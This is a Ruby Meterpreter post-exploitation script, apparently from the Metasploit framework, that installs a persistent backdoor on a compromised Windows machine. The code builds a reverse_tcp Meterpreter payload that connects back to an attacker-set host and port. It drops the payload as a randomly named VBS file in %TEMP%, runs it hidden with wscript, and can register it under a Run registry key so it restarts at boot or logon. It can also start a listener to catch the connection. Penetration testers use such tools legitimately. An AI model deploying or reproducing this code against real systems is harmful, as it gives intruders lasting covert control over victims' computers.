# $Id$

#
# Meterpreter script for installing a persistent meterpreter
#

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end


session = client
key = "HKLM"
#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"],
	"-i"  => [ true,   "The interval in seconds between each connection attempt"],
	"-X"  => [ false,  "Automatically start the agent when the system boots"],
	"-U"  => [ false,  "Automatically start the agent when the User logs on"],
	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"]
)

#
# Default parameters
#

rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
delay = 5
install = false
autoconn = false
##

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		return
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	when "-i"
		delay = val.to_i
	when "-X"
		install = true
		key = "HKLM"
	when "-U"
		install = true
		key = "HKCU"
	when "-A"
		autoconn = true
	end
end
platform = client.platform.scan(/(win32|win64)/)
unsupported if not platform
host_name = client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'persistence', host_name + filenameinfo )

# Create the log directory
::FileUtils.mkdir_p(logs)

# Cleaup script file name
dest = logs + "/clean_up_" + filenameinfo + ".rc"

#
# Create the persistent VBS
#

print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
raw  = pay.generate

vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
print_status("Persistent agent script is #{vbs.length} bytes long")


#
# Upload to the filesystem
#

tempdir = client.fs.file.expand_path("%TEMP%")
tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
fd = client.fs.file.new(tempvbs, "wb")
fd.write(vbs)
fd.close

print_status("Uploaded the persistent agent to #{tempvbs}")

#
# Execute the agent
#
proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
print_status("Agent executed with PID #{proc.pid}")
file_local_write(dest, "kill #{proc.pid}\n")
#
# Setup the multi/handler if requested
#
if(autoconn)
	mul = client.framework.exploits.create("multi/handler")
	mul.datastore['WORKSPACE'] = client.workspace
	mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
	mul.datastore['LHOST']     = rhost
	mul.datastore['LPORT']     = rport
	mul.datastore['EXITFUNC']  = 'process'
	mul.datastore['ExitOnSession'] = false

	mul.exploit_simple(
		'Payload'        => mul.datastore['PAYLOAD'],
		'RunAsJob'       => true
	)
end

#
# Make the agent restart on boot
#
if(install)
	nam = Rex::Text.rand_text_alpha(rand(8)+8)
	print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
	if(key)
		registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,tempvbs,"REG_SZ")
		print_status("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		file_local_write(dest, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
	else
		print_status("Error: failed to open the registry key for writing")
	end
end
print_status("For cleanup use command: run multi_console_command -rc #{dest}")
